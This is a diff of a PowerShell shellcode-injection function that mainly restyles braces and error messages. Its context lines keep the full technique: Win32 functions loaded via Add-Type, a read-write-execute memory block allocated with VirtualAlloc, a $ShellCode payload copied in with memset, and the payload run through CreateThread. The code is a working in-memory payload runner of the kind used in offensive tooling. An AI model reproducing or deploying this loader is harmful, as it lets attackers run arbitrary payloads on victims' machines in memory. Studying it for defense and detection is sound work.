@@ -66,11 +66,9 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
     $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
     $Size = 0x1000
 
-    If ($ShellCode.Length -gt 0x1000)
-    {
+    If ($ShellCode.Length -gt 0x1000) {
 
         $Size = $ShellCode.Length
-
         Write-Verbose "Length of payload is $Size"
 
     }  # End If
@@ -79,48 +77,30 @@ public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
     $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)
 
     Write-Verbose "Writing payload to newly allocated memory block using memset()..."
-    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ )
-    {
+    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ ) {
 
-        Try
-        {
+        Try {
 
             $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)
 
-        }  # End Try
-        Catch [Exception]
-        {
+        } Catch [Exception] {
 
             $Error[0]
+            Throw "[x] There was an error executing payload. Cmdlet is being prevented from allocating memory with the utilized DLLs."
 
-             Write-Host "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs." -ForegroundColor "Red"
+        } Catch {
 
-             Pause
+            Throw "[x] I have not caught this error before. Please email me the results at rosborne@osbornepro.com"
 
-             Exit
-
-        }  # End Catch
-        Catch
-        {
-
-            Write-Host "I have not caught this error before. Please email me the results at rosborne@osbornepro.com" -ForegrounColor 'Cyan'
-
-            $Error[0]
-
-            Pause
-
-            Exit
-
-        }  # End Catch
+        }  # End Try Catch Catch
 
     }  # End For
 
     Write-Verbose "Executing in separte thread using CreateThread()..."
     $WinFunc::CreateThread(0,0,$X,0,0,0)
-    For (;;)
-    {
+    For (;;) {
 
-        Start-sleep -Seconds 60
+        Start-Sleep -Seconds 60
 
     }  # End For
 
